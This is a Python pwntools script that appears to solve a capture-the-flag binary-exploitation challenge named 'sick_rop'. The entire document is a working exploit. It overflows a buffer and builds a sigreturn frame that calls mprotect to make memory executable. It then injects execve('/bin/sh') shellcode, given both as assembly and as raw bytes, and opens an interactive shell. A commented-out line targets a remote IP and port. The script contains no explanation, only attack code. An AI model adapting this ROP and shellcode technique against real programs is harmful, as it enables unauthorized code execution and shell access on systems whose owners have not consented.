#!/usr/bin/env python3

from pwn import *
#p = remote("178.62.84.158", 30640)
p = process("./sick_rop")
context.arch = 'amd64'


syscall = 0x0000000000401014
pad = b"a"*0x28 
read = 0x0000000000401000
vuln = 0x000000000040102e
vuln_ptr = 0x4010d8
frame = SigreturnFrame()
frame.rdi = 0x00400000
frame.rip = syscall
frame.rsi = 10000
frame.rdx = 0x7
frame.rsp = vuln_ptr
frame.rax = 0xa

payload = pad + p64(vuln) + p64(syscall) + bytes(frame)
p.sendline(payload)
p.recv()

p.send(b"A"*0xf)
p.recv()

shellcode =  """mov rdi, 0x68732f6e69622f
                push rdi
                mov rdi, rsp
                mov rax, 0x3b
                xor rsi, rsi
                xor rdx, rdx
                syscall"""
               
shellcode2 = b"\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x48\x89\xE7\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05"
payload = pad + p64(0x4010d8 + 0x10) + shellcode2
p.sendline(payload)




p.interactive()
